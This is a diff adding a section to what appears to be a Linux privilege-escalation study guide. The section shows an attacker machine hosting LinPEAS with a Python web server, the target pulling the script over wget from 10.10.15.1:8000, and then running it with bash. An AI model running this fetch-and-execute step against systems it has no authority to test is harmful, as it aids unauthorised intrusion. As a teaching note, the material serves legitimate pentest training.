@@ -2,6 +2,7 @@
 
  - [User Permissions](Root.md#user-permissions)
  - [File Permissions](Root.md#file-permissions)
+ - [LinPEAS and LinEnum](Root.md#linpeas-and-linenum)
 
 ## User Permissions
 
@@ -100,3 +101,54 @@ user@parrot:~$ find /bin/ -perm /u=s,g=s
 /bin/umount
 ...
 ```
+
+## LinPEAS and LinEnum
+
+[LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) and [LinEnum](https://github.com/rebootuser/LinEnum) are both great scripts for finding privilege escalation paths.  
+To get these scripts onto a target machine, the easiest way is to use a python server to serve the file and use wget to download the file.  
+
+```
+Command Breakdown:
+    python: An object-oriented programming languages
+    -m SimpleHTTPServer: A module that opens a webserver to serve files in the current directory. 
+```
+
+```console
+user@parrot:~$ python -m SimpleHTTPServer
+Serving HTTP on 0.0.0.0 port 8000 ...
+```
+By default, SimpleHTTPServer will serve the files on port 8000,  
+so when you want to wget your files, you'll have to specify the port.
+
+```
+Command Breakdown:
+    wget: A tool to download files from the web
+    10.10.15.1:8000: The address of your local machine that's serving the files.
+```
+
+```console
+user@example:~$ wget 10.10.15.1:8000/linpeas.sh
+--2021-01-12 22:07:20-- http://10.10.15.1:8000/linpeas.sh
+Connecting to 10.10.15.1:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 318386 (311K) [text/plain]
+Saving to: 'linpeas.sh'
+
+linpeas.sh          100%[===================>]        310.92K   --.-KB/s     in 0.004s
+
+2021-01-12 22:07:20 (71.8 MB/s) - ‘linpeas.sh’ saved [318386/318386]
+```
+
+```
+Command Breakdown:
+    bash: Bourne-Again SHell
+    linpeas.sh: The file you want to run
+```
+
+```console
+user@example:~$ bash linpeas.sh
+Starting linpeas. Caching Writable Folders...
+...
+```
+
+Pro tip: Update your enumeration scripts from time to time; it can save you a lot of frustration.
